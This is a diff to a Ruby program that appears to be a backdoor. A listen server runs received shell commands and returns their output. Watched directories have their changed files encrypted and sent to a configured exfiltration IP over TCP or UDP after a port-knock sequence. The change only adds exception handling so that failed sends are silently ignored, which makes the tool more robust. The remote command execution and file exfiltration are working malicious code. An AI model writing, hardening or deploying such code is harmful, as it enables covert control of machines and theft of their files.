@@ -88,7 +88,10 @@ def start_listen_server
           when MODE_SHELL
             cmd = cmds[2..-1].join(' ')
             results = %x{ #{cmd} } #execute and store output
-            send_out(:msg, results)
+            begin
+              send_out(:msg, results)
+            rescue IOError
+            end
           when MODE_WATCH
             if cmds[2] == DIR
               start_watch(DIR, cmds[3])
@@ -129,15 +132,24 @@ def start_watch(type, name)
   monitor.path path, glob do
     update { |base, relative|
       puts "#{base}/#{relative} has been updated"
-      send_out(:file, "#{base}/#{relative}")
+      begin
+        send_out(:file, "#{base}/#{relative}")
+      rescue IOError
+      end
     }
     delete { |base, relative|
       puts "#{base}/#{relative} has been deleted"
-      send_out(:msg, "#{base}/#{relative} has been deleted")
+      begin
+        send_out(:msg, "#{base}/#{relative} has been deleted")
+      rescue IOError
+      end
     }
     create { |base, relative|
       puts "#{base}/#{relative} has been created"
-      send_out(:msg, "#{base}/#{relative}")
+      begin
+        send_out(:msg, "#{base}/#{relative}")
+      rescue IOError
+      end
     }
   end
   t = Thread.new {
@@ -160,39 +172,44 @@ end
 #   if update or create, passes the pathname to send file
 def send_out(mode, data)
   socket = nil
-  if $cfg_exfil_protocol == UDP
-    socket = UDPSocket.new
-    socket.bind($cfg_exfil_ip, $cfg_pen_port.to_i)
-  elsif $cfg_exfil_protocol == TCP
-    socket = TCPSocket.new($cfg_exfil_ip, $cfg_pen_port.to_i)
-  else
-    #not implemneted protocol
-  end
-      
-  if mode == :file
-    generate_knock_seq
-    File.open(data, "rb") do |f|
-      fp = f.readlines
-      if $cfg_exfil_protocol == UDP
-        socket.send(encrypt(fp))
-      elsif $cfg_exfil_protocol == TCP
-        socket.puts(encrypt(fp))
-      else
-        #not implemneted protocol
-      end
-    end
-  elsif mode == :msg
-    generate_knock_seq
+  begin
     if $cfg_exfil_protocol == UDP
-        socket.send(encrypt(data))
-      elsif $cfg_exfil_protocol == TCP
-        socket.puts(encrypt(data))
-      else
-        #not implemneted protocol
+      socket = UDPSocket.new
+      socket.bind($cfg_exfil_ip, $cfg_pen_port.to_i)
+    elsif $cfg_exfil_protocol == TCP
+      socket = TCPSocket.new($cfg_exfil_ip, $cfg_pen_port.to_i)
+    else
+      #not implemneted protocol
+    end
+      
+    if mode == :file
+      generate_knock_seq
+      File.open(data, "rb") do |f|
+        fp = f.readlines
+        if $cfg_exfil_protocol == UDP
+          socket.send(encrypt(fp))
+        elsif $cfg_exfil_protocol == TCP
+          socket.puts(encrypt(fp))
+        else
+          #not implemneted protocol
+        end
       end
-  else
-    #should probs not get here
-  end     
+    elsif mode == :msg
+      generate_knock_seq
+      if $cfg_exfil_protocol == UDP
+          socket.send(encrypt(data))
+        elsif $cfg_exfil_protocol == TCP
+          socket.puts(encrypt(data))
+        else
+          #not implemneted protocol
+        end
+    else
+      #should probs not get here
+    end
+  rescue Exception => e
+  ensure
+    socket.close
+  end
 end
 
 # Generates knock sequence to the configured protocol and client.
